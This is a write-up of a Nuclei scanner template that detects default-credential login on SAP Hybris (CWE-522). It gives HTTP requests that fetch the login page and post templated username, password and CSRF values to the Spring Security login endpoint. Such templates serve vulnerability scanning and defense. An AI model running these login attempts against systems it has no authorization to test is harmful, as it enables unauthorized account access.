# Nuclei Template: Hybris - Default Login
**Template ID:** hybris-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`hybris-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Hybris contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{path}}login HTTP/1.1
Host: {{Hostname}}

POST {{path}}j_spring_security_check HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}login

j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}

GET {{path}} HTTP/1.1
Host: {{Hostname}}
```

